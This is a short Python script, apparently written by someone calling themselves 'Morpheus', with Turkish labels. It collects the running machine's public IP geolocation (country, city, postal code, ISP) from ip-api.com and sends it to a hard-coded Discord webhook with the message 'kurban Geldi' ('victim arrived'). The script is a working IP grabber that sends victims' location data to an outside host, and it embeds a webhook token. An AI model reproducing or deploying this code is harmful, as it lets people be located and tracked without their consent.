import requests
import json
from dhooks import Webhook, Embed

def ip_sorgu():
    url = "http://ip-api.com/json/"
    veri = requests.get(url).json()
    country = veri["country"]
    countryCode = veri["countryCode"]
    regionName = veri["regionName"]
    region = veri["region"]
    city  = veri["city"]
    zip  = veri["zip"]
    timezone = veri["timezone"]
    isp  = veri["isp"]
    ass = veri["as"]
    
    # Discord Webhook URL'nizi buraya girin
    webhook_url = "https://discord.com/api/webhooks/1086013408303923220/peco4TnKgpK44nZE4I5DV9eIUPm_r4sMwhWxxMVisg6f7qDvc8IxdSJfocbeBmvKOKeX"
    
        
    hook = Webhook(webhook_url,avatar_url="https://i.hizliresim.com/gb6474y.png")
    embed = Embed(title="Github Hesabı ", description="IP Sorgusu", color=0x00ff00, url="https://github.com/Morpheusxd")
    embed.add_field(name="Ülke" ,value=country)
    embed.add_field(name="Ülke kodu", value=countryCode)
    embed.add_field(name="Bölge adı", value=regionName)
    embed.add_field(name="Bölge", value=region)
    embed.add_field(name="Şehir", value=city)
    embed.add_field(name="Posta Kodu", value=zip)
    embed.add_field(name="Zaman Dilimi", value=timezone)
    embed.add_field(name="ISP", value=isp)
    embed.add_field(name="As Numarası/Adı", value=ass)
    embed.set_image(url="https://i.hizliresim.com/7gyd8ut.png")

    embed.set_author(name="Morpheus", icon_url="https://i.hizliresim.com/fbi4zxw.png")
    embed.set_footer(text="bu araç Morpheus Tarafından Yazılmıştır ",icon_url="https://s3.tradingview.com/userpics/18470545-PpQT_big.png")
    hook.send(embed=embed)
    hook.send("kurban Geldi")

